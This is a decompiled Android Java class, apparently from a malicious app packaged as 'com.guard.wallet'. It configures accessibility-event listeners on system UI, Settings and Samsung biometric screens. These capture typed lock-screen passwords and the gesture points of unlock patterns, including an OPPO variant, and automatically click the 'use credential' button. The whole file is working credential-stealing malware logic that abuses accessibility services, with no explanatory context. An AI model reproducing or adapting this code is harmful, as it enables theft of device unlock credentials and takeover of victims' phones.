package p012o;

import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenWindow;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Objects;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;

/* renamed from: o.h */
/* loaded from: classes.dex */
public final class C0419h extends C0416e {
    public C0419h() {
        super(m1110M(), "com.android.systemui");
    }

    /* renamed from: H */
    public static CombineFilter m1105H(String str) {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), "id");
        m1008b.setEquals(str.concat(":id/button_use_credential"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* renamed from: I */
    public static ListenWindow m1106I(String str) {
        ListenWindow listenWindow = new ListenWindow(str, null);
        listenWindow.setId("confirmDeviceCredentialNoneWithSubscribes:".concat(str));
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(m1109L(str));
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(2048, AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow), listenWindow).add(16384);
        listenWindow.getEventSubscribes().add(m1114Q(str));
        listenWindow.getEventSubscribes().add(m1111N(str));
        listenWindow.getEventSubscribes().add(m1112O(str));
        listenWindow.getEventSubscribes().add(m1113P(str));
        return listenWindow;
    }

    /* renamed from: J */
    public static ListenWindow m1107J(String str) {
        ListenWindow listenWindow = new ListenWindow(str, "com.android.settings.password.ConfirmDeviceCredentialActivity");
        listenWindow.setId("confirmDeviceCredentialWithSubscribes:".concat(str));
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(m1109L(str));
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(2048, AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow), listenWindow).add(16384);
        listenWindow.getEventSubscribes().add(m1114Q(str));
        listenWindow.getEventSubscribes().add(m1111N(str));
        listenWindow.getEventSubscribes().add(m1112O(str));
        listenWindow.getEventSubscribes().add(m1113P(str));
        return listenWindow;
    }

    /* renamed from: K */
    public static ListenWindow m1108K(String str) {
        ListenWindow listenWindow = new ListenWindow(str, "com.android.settings.password.ConfirmLockPassword");
        listenWindow.setId("confirmLockPasswordWithSubscribes:".concat(str));
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(2048, AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow), listenWindow).add(16384);
        listenWindow.getEventSubscribes().add(m1114Q(str));
        listenWindow.getEventSubscribes().add(m1111N(str));
        return listenWindow;
    }

    /* renamed from: L */
    public static CombineFilter m1109L(String str) {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), "id");
        m1008b.setEquals(str.concat(":id/title"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    /* renamed from: M */
    public static LinkedList m1110M() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(m1115R("com.android.systemui"));
        linkedList.add(m1107J("com.android.systemui"));
        linkedList.add(m1106I("com.android.systemui"));
        linkedList.add(m1108K("com.android.systemui"));
        linkedList.add(m1115R("com.android.settings"));
        linkedList.add(m1107J("com.android.settings"));
        linkedList.add(m1106I("com.android.settings"));
        linkedList.add(m1108K("com.android.settings"));
        linkedList.add(m1115R("com.samsung.android.biometrics.app.setting"));
        linkedList.add(m1107J("com.samsung.android.biometrics.app.setting"));
        linkedList.add(m1106I("com.samsung.android.biometrics.app.setting"));
        linkedList.add(m1108K("com.samsung.android.biometrics.app.setting"));
        return linkedList;
    }

    /* renamed from: N */
    public static EventSubscribe m1111N(String str) {
        EventSubscribe eventSubscribe = new EventSubscribe();
        eventSubscribe.setId("lockPasswordEditSubscribe:".concat(str));
        eventSubscribe.setListenType(1);
        eventSubscribe.setSourceRule(0);
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.EditText"));
        eventSubscribe.setCombineFilter(combineFilter);
        eventSubscribe.setListenProps(new LinkedList());
        eventSubscribe.getListenProps().add(TextBundle.TEXT_ENTRY);
        eventSubscribe.setEventTypes(new HashSet<>());
        eventSubscribe.getEventTypes().add(16);
        eventSubscribe.getEventTypes().add(8192);
        return eventSubscribe;
    }

    /* renamed from: O */
    public static EventSubscribe m1112O(String str) {
        EventSubscribe eventSubscribe = new EventSubscribe();
        eventSubscribe.setId("lockPatternSubscribe:".concat(str));
        eventSubscribe.setListenType(1);
        eventSubscribe.setSourceRule(0);
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "id");
        m1008b.setEquals(str.concat(":id/lockPattern"));
        combineFilter.getStringConditions().add(m1008b);
        eventSubscribe.setCombineFilter(combineFilter);
        eventSubscribe.setListenProps(new LinkedList());
        eventSubscribe.getListenProps().add("boundsInScreen");
        eventSubscribe.getListenProps().add("boundsInParent");
        eventSubscribe.getListenProps().add("GESTURE_POINTS");
        eventSubscribe.setHelperProp("GESTURE_POINTS");
        eventSubscribe.setListenHelper(true);
        eventSubscribe.setEventTypes(new HashSet<>());
        eventSubscribe.getEventTypes().add(32);
        eventSubscribe.getEventTypes().add(2048);
        eventSubscribe.getEventTypes().add(16384);
        return eventSubscribe;
    }

    /* renamed from: P */
    public static EventSubscribe m1113P(String str) {
        EventSubscribe eventSubscribe = new EventSubscribe();
        eventSubscribe.setId("oppoLockPatternSubscribe:".concat(str));
        eventSubscribe.setListenType(1);
        eventSubscribe.setSourceRule(0);
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.view.View"), "id");
        m1008b.setEquals(str.concat(":id/biometric_lockPattern"));
        combineFilter.getStringConditions().add(m1008b);
        eventSubscribe.setCombineFilter(combineFilter);
        eventSubscribe.setListenProps(new LinkedList());
        eventSubscribe.getListenProps().add("boundsInScreen");
        eventSubscribe.getListenProps().add("boundsInParent");
        eventSubscribe.getListenProps().add("GESTURE_POINTS");
        eventSubscribe.setHelperProp("GESTURE_POINTS");
        eventSubscribe.setListenHelper(true);
        eventSubscribe.setEventTypes(new HashSet<>());
        eventSubscribe.getEventTypes().add(32);
        eventSubscribe.getEventTypes().add(2048);
        eventSubscribe.getEventTypes().add(16384);
        return eventSubscribe;
    }

    /* renamed from: Q */
    public static EventSubscribe m1114Q(String str) {
        EventSubscribe eventSubscribe = new EventSubscribe();
        eventSubscribe.setId("useCredentialEventSubscribe:".concat(str));
        eventSubscribe.setListenType(1);
        eventSubscribe.setSourceRule(0);
        eventSubscribe.setCombineFilter(m1105H(str));
        eventSubscribe.setEventTypes(new HashSet<>());
        eventSubscribe.getEventTypes().add(32);
        eventSubscribe.getEventTypes().add(2048);
        eventSubscribe.getEventTypes().add(16384);
        TargetActionCondition targetActionCondition = new TargetActionCondition();
        targetActionCondition.setActionType(1);
        targetActionCondition.setActionName("click");
        eventSubscribe.setReplyActions(new LinkedList());
        eventSubscribe.getReplyActions().add(targetActionCondition);
        return eventSubscribe;
    }

    /* renamed from: R */
    public static ListenWindow m1115R(String str) {
        ListenWindow listenWindow = new ListenWindow(str, "android.widget.LinearLayout");
        listenWindow.setId("useCredentialLayoutWithSubscribes:".concat(str));
        listenWindow.setMatchs(new LinkedList());
        listenWindow.getMatchs().add(m1105H(str));
        listenWindow.setEventTypes(new HashSet<>());
        AbstractC0413b.m1023q(2048, AbstractC0413b.m1023q(32, listenWindow.getEventTypes(), listenWindow), listenWindow).add(16384);
        listenWindow.getEventSubscribes().add(m1114Q(str));
        return listenWindow;
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        return obj instanceof C0419h;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(C0419h.class.getName());
    }

    @Override // p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        super.mo1002u(accessibilityEvent, str, str2);
    }
}
